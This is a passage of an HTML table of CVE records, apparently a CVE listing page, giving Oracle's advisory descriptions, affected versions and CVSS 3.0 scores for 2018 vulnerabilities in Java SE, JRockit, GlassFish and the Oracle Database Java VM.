		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Java DB). Supported versions that are affected are Java SE: 6u191, 7u181 and 8u172. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. While the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVE-2018-2938 addresses CVE-2018-1313. CVSS 3.0 Base Score 9.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2911">CVE-2018-2911</a></td>
		<td valign="top">Vulnerability in the Oracle GlassFish Server component of Oracle Fusion Middleware (subcomponent: Java Server Faces). The supported version that is affected is 3.1.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle GlassFish Server. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle GlassFish Server accessible data as well as unauthorized access to critical data or complete access to all Oracle GlassFish Server accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle GlassFish Server. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2841">CVE-2018-2841</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2 and 12.2.0.1. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. While the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 8.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2826">CVE-2018-2826</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Libraries). The supported version that is affected is Java SE: 10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2825">CVE-2018-2825</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Libraries). The supported version that is affected is Java SE: 10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2815">CVE-2018-2815</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2814">CVE-2018-2814</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2811">CVE-2018-2811</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Install). Supported versions that are affected are Java SE: 8u162 and 10. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE executes to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: Applies to installation process on client deployment of Java. CVSS 3.0 Base Score 7.7 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2800">CVE-2018-2800</a></td>
		<td valign="top">Vulnerability in the Java SE, JRockit component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u181, 7u171 and 8u162; JRockit: R28.3.17. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, JRockit. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, JRockit accessible data as well as unauthorized read access to a subset of Java SE, JRockit accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 4.2 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2799">CVE-2018-2799</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAXP). Supported versions that are affected are Java SE: 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2798">CVE-2018-2798</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2797">CVE-2018-2797</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JMX). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2796">CVE-2018-2796</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Concurrency). Supported versions that are affected are Java SE: 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2795">CVE-2018-2795</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161; JRockit: R28.3.17. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2794">CVE-2018-2794</a></td>
		<td valign="top">Vulnerability in the Java SE, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162, 10 and JRockit: R28.3.17. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE, JRockit executes to compromise Java SE, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.7 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2790">CVE-2018-2790</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u181, 7u171, 8u162 and 10; Java SE Embedded: 8u161. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2783">CVE-2018-2783</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u181, 7u161 and 8u152; Java SE Embedded: 8u152; JRockit: R28.3.17. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, JRockit accessible data as well as unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2680">CVE-2018-2680</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2 and 12.2.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java VM. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2678">CVE-2018-2678</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JNDI). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2677">CVE-2018-2677</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2675">CVE-2018-2675</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.8. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java Advanced Management Console. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2663">CVE-2018-2663</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2657">CVE-2018-2657</a></td>
		<td valign="top">Vulnerability in the Java SE, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u171 and 7u161; JRockit: R28.3.16. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, JRockit. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2641">CVE-2018-2641</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 6.1 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2639">CVE-2018-2639</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 8u152 and 9.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2638">CVE-2018-2638</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 8u152 and 9.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2637">CVE-2018-2637</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JMX). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, JRockit accessible data as well as unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2634">CVE-2018-2634</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JGSS). Supported versions that are affected are Java SE: 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. While the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2633">CVE-2018-2633</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JNDI). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2629">CVE-2018-2629</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JGSS). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2627">CVE-2018-2627</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Installer). Supported versions that are affected are Java SE: 8u152 and 9.0.1. Difficult to exploit vulnerability allows low privileged attacker with logon to the infrastructure where Java SE executes to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to the Windows installer only. CVSS 3.0 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2618">CVE-2018-2618</a></td>
